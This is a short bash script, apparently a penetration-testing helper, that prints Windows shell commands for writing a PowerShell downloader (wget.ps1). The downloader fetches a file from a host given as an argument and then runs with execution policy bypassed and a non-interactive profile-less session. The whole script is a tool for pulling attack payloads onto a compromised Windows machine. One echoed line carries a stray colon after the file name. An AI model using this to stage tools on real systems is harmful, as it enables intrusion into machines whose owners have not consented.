#!/bin/bash

echo "echo \$storageDir = \$pwd > wget.ps1"
echo "echo \$webclient = New-Object System.Net.WebClient >>wget.ps1" 
echo "echo \$url = \"http://$2/$1\" >>wget.ps1:"
echo "echo \$file = \"$1\" >>wget.ps1"
echo "echo \$webclient.DownloadFile(\$url,\$file) >>wget.ps1"
echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
echo ""
echo ""
